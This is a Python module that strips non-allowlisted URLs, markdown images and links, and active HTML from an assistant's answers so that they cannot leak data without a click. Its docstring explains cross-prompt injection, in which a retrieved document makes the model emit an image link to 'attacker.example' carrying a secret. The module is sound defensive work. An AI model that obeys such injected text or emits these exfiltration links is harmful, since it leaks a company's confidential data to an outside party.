"""Deterministic removal of zero-click exfiltration channels from answers.

Cross-prompt injection (XPIA) lets an *authorized* retrieved document instruct
the model to emit something like ``![x](https://attacker.example/?d=<secret>)``.
Chat clients (Teams, Slack, web chat) render images and unfurl link previews
automatically, so the secret leaves the company with no user click — even
though Layer 1 and Layer 2 correctly authorized every source the model used.

Prompt-level defenses are probabilistic. This filter is deterministic: after
Layer 2 allows, every URL whose host is not on the operator's allowlist is
neutralized, and active HTML is stripped. It only removes content, so it can
never widen what an employee may see.
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from urllib.parse import urlsplit

_ACTIVE_HTML = re.compile(
    r"<\s*(img|iframe|script|style|object|embed|link|meta|form|input|video|audio|source|svg|base|frame|frameset)\b[^>]*>"
    r"(?:.*?<\s*/\s*\1\s*>)?",
    re.IGNORECASE | re.DOTALL,
)
_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+(?:\"[^\"]*\"|'[^']*'))?\s*\)")
_MD_LINK = re.compile(r"(?<!!)\[([^\]]+)\]\(\s*<?([^)\s>]+)>?(?:\s+(?:\"[^\"]*\"|'[^']*'))?\s*\)")
_REF_DEF = re.compile(r"^([ \t]{0,3}\[[^\]]+\]:[ \t]*)<?(\S+?)>?([ \t]+.*)?$", re.MULTILINE)
_AUTOLINK = re.compile(r"<((?:https?|ftp|mailto|data|javascript):[^>\s]+)>", re.IGNORECASE)
_BARE_URL = re.compile(r"(?i)\b(?:https?|ftp)://[^\s<>()\[\]\"'`]+")
_ABSOLUTE = re.compile(r"(?i)^[a-z][a-z0-9+.-]*:")


@dataclass(frozen=True)
class OutputLinkPolicy:
    """Hosts whose URLs may be released. ``.example.com`` also matches subdomains."""

    allowed_hosts: frozenset[str] = frozenset()

    @classmethod
    def from_csv(cls, raw: str) -> "OutputLinkPolicy":
        hosts = {item.strip().lower().rstrip(".") for item in raw.split(",") if item.strip()}
        if any(not re.fullmatch(r"\.?[a-z0-9-]+(\.[a-z0-9-]+)+", host) for host in hosts):
            raise ValueError("Output link allowlist must contain host names only")
        return cls(frozenset(hosts))

    def allows(self, url: str) -> bool:
        if not _ABSOLUTE.match(url) and not url.startswith("//"):
            return True  # relative link: resolved against the customer's own app
        try:
            parts = urlsplit(url if not url.startswith("//") else "https:" + url)
        except ValueError:
            return False
        host = (parts.hostname or "").lower().rstrip(".")
        if parts.scheme.lower() not in {"http", "https"} or not host or parts.username or parts.password:
            return False
        for allowed in self.allowed_hosts:
            if allowed.startswith("."):
                if host.endswith(allowed) or host == allowed[1:]:
                    return True
            elif host == allowed:
                return True
        return False


def sanitize_answer(text: str, policy: OutputLinkPolicy) -> tuple[str, int]:
    """Return ``(safe_text, neutralized_count)``."""
    removed = 0

    def html(match: re.Match[str]) -> str:
        nonlocal removed
        removed += 1
        return "[content removed]"

    def image(match: re.Match[str]) -> str:
        nonlocal removed
        if policy.allows(match.group(2)):
            return match.group(0)
        removed += 1
        alt = match.group(1).strip()
        return f"[image removed{': ' + alt if alt else ''}]"

    def link(match: re.Match[str]) -> str:
        nonlocal removed
        if policy.allows(match.group(2)):
            return match.group(0)
        removed += 1
        return f"{match.group(1)} (link removed)"

    def ref(match: re.Match[str]) -> str:
        nonlocal removed
        if policy.allows(match.group(2)):
            return match.group(0)
        removed += 1
        return f"{match.group(1)}#link-removed"

    def autolink(match: re.Match[str]) -> str:
        nonlocal removed
        if policy.allows(match.group(1)):
            return match.group(0)
        removed += 1
        return "[link removed]"

    def bare(match: re.Match[str]) -> str:
        nonlocal removed
        url = match.group(0).rstrip(".,;:!?")
        tail = match.group(0)[len(url):]
        if policy.allows(url):
            return match.group(0)
        removed += 1
        return "[link removed]" + tail

    safe = _ACTIVE_HTML.sub(html, text)
    safe = _MD_IMAGE.sub(image, safe)
    safe = _MD_LINK.sub(link, safe)
    safe = _REF_DEF.sub(ref, safe)
    safe = _AUTOLINK.sub(autolink, safe)
    # Bare URLs last; skip those that survived as allowed markdown targets.
    safe = _BARE_URL.sub(bare, safe)
    return safe, removed
